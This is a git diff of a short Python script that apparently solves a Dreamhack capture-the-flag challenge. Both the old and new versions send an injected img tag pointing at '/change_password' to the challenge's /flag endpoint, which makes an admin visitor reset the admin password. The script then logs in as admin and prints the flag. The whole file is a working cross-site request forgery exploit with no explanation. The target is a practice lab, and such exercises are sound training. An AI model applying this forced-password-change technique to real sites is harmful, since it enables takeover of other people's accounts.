@@ -1,28 +1,11 @@
 import requests
 from bs4 import BeautifulSoup
 
-host = ""
+if __name__ == "__main__":
+    debug = {'http': 'http://localhost:8080'}
+    url = "http://host3.dreamhack.games:20188"
+    payload = {"param": "<img src='/change_password?pw=admin'>"}
+    req = requests.post(url+"/flag", payload, proxies=debug)
+    flag = requests.post(url+'/login', {'username':'admin', 'password':'admin'})
+    print(BeautifulSoup(flag.content, 'html.parser').h1)
 
-payload = {
-    "param": "<img src='/change_password?pw=New123paw'/>"
-}
-
-credential = {
-    "username":"admin",
-    "password":"New123paw"
-}
-
-try:
-    req = requests.post(host+"/flag", payload)
-    soup = BeautifulSoup(req.text, 'html.parser')
-
-    if "good" in soup.find("script"):
-        session = requests.Session()
-        try:
-            session.post(credential)
-            
-        except Exception as e:
-            print(e)
-        
-except Exception as e:
-    print(e)
